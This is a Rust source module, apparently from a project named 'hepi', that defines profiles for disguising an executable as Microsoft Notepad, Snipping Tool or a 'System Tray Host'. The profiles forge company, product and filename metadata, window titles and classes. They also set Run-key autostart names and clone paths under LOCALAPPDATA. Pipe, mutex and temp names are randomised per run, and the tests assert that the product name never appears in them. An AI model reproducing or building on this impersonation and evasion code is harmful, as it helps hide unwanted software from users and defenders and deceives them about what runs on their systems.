//! Bảng profile hiển thị. Dữ liệu thuần: không I/O, không Win32.
//! Nằm ở `core` vì `app_identity` cần nó; `hepi-identity` chỉ orchestration.
//!
//! Template nhận `{guid}` (GUID v4 mỗi lần chạy) và `{hex}` (8 hex thường).
//! Runtime không dùng chuỗi sản phẩm, nên pipe/mutex/temp đều là template.

use crate::{E, Res};

pub struct Profile {
    pub exe_name: &'static str,
    /// `self` = icon nhúng của chính app; còn lại là đường dẫn tệp nguồn.
    pub icon_source: &'static str,
    pub file_description: &'static str,
    pub company_name: &'static str,
    pub product_name: &'static str,
    pub original_filename: &'static str,
    pub run_value_name: &'static str,
    pub temp_dir_template: &'static str,
    pub pipe_template: &'static str,
    pub mutex_template: &'static str,
    pub window_title: &'static str,
    pub class_name: &'static str,
}

pub const PROFILES: &[Profile] = &[
    Profile {
        exe_name: "Notepad.exe",
        icon_source: "self",
        file_description: "Notepad",
        company_name: "Microsoft Corporation",
        product_name: "Microsoft® Windows® Operating System",
        original_filename: "NOTEPAD.EXE",
        run_value_name: "Notepad",
        temp_dir_template: "{hex}",
        pipe_template: r"\\.\pipe\{guid}",
        mutex_template: "Global\\{guid}",
        window_title: "Untitled - Notepad",
        class_name: "Notepad",
    },
    Profile {
        exe_name: "SnipHost.exe",
        icon_source: "self",
        file_description: "Snipping Tool",
        company_name: "Microsoft Corporation",
        product_name: "Microsoft® Windows® Operating System",
        original_filename: "SNIPHOST.EXE",
        run_value_name: "SnipHost",
        temp_dir_template: "{hex}",
        pipe_template: r"\\.\pipe\{guid}",
        mutex_template: "Global\\{guid}",
        window_title: "Snipping Tool",
        class_name: "SnipHostWnd",
    },
    Profile {
        exe_name: "SysTrayHost.exe",
        icon_source: "self",
        file_description: "System Tray Host",
        company_name: "Microsoft Corporation",
        product_name: "Microsoft® Windows® Operating System",
        original_filename: "SYSTRAYHOST.EXE",
        run_value_name: "SysTrayHost",
        temp_dir_template: "{hex}",
        pipe_template: r"\\.\pipe\{guid}",
        mutex_template: "Global\\{guid}",
        window_title: "System Tray",
        class_name: "SysTrayHostWnd",
    },
];

pub const DEFAULT_PROFILE: &str = "SnipHost.exe";

impl Profile {
    pub fn dir_name(&self) -> &'static str {
        self.exe_name.strip_suffix(".exe").unwrap_or(self.exe_name)
    }

    pub fn helper_name(&self) -> String {
        format!("{}.Helper.exe", self.dir_name())
    }

    /// `%LOCALAPPDATA%\Programs\<dir>\<exe>`
    pub fn clone_path(&self, local_appdata: &std::path::Path) -> std::path::PathBuf {
        local_appdata.join("Programs").join(self.dir_name()).join(self.exe_name)
    }

    pub fn helper_path(&self, local_appdata: &std::path::Path) -> std::path::PathBuf {
        local_appdata.join("Programs").join(self.dir_name()).join(self.helper_name())
    }

    fn fill(template: &str, guid: &str, hex: &str) -> String {
        template.replace("{guid}", guid).replace("{hex}", hex)
    }

    pub fn pipe_path(&self, guid: &str, hex: &str) -> String {
        Self::fill(self.pipe_template, guid, hex)
    }

    pub fn mutex_name(&self, guid: &str, hex: &str) -> String {
        Self::fill(self.mutex_template, guid, hex)
    }

    pub fn temp_dir_name(&self, guid: &str, hex: &str) -> String {
        Self::fill(self.temp_dir_template, guid, hex)
    }
}

pub fn by_name(name: &str) -> Option<&'static Profile> {
    PROFILES
        .iter()
        .find(|p| p.exe_name.eq_ignore_ascii_case(name) || p.dir_name().eq_ignore_ascii_case(name))
}

/// assert_profile_1 — bảng không được hỏng về dữ liệu.
pub fn assert_table() -> Res<()> {
    if PROFILES.is_empty() {
        return Err(E::State);
    }
    for p in PROFILES {
        let fields = [
            p.exe_name,
            p.icon_source,
            p.file_description,
            p.company_name,
            p.product_name,
            p.original_filename,
            p.run_value_name,
            p.temp_dir_template,
            p.pipe_template,
            p.mutex_template,
            p.window_title,
            p.class_name,
        ];
        if fields.iter().any(|f| f.is_empty()) {
            return Err(E::State);
        }
        if !p.exe_name.to_ascii_lowercase().ends_with(".exe") {
            return Err(E::State);
        }
        if !p.pipe_template.contains("{guid}") || !p.temp_dir_template.contains("{hex}") {
            return Err(E::State);
        }
        if p.pipe_template.to_ascii_lowercase().contains("hepi") {
            return Err(E::State);
        }
    }
    for (i, a) in PROFILES.iter().enumerate() {
        for b in &PROFILES[i + 1..] {
            if a.exe_name.eq_ignore_ascii_case(b.exe_name)
                || a.class_name.eq_ignore_ascii_case(b.class_name)
                || a.run_value_name.eq_ignore_ascii_case(b.run_value_name)
            {
                return Err(E::State);
            }
        }
    }
    Ok(())
}

/// assert_profile_2 — cùng một lần chạy thì khác GUID, hai lần chạy phải khác tên.
pub fn assert_unique_per_run(guid_a: &str, guid_b: &str, hex_a: &str, hex_b: &str) -> Res<()> {
    if guid_a == guid_b || hex_a == hex_b {
        return Err(E::State);
    }
    for p in PROFILES {
        if p.pipe_path(guid_a, hex_a) == p.pipe_path(guid_b, hex_b) {
            return Err(E::State);
        }
        if p.temp_dir_name(guid_a, hex_a) == p.temp_dir_name(guid_b, hex_b) {
            return Err(E::State);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const A: &str = "11111111-1111-4111-8111-111111111111";
    const B: &str = "22222222-2222-4222-8222-222222222222";

    #[test]
    fn table_ok() {
        assert!(assert_table().is_ok());
    }

    #[test]
    fn names_unique_per_run() {
        assert!(assert_unique_per_run(A, B, "deadbeef", "cafebabe").is_ok());
    }

    #[test]
    fn no_product_string_in_surface_names() {
        for p in PROFILES {
            let s = format!(
                "{} {} {}",
                p.pipe_path(A, "0"),
                p.mutex_name(A, "0"),
                p.temp_dir_name(A, "0")
            );
            assert!(!s.to_ascii_lowercase().contains("hepi"), "{}", s);
        }
    }
}
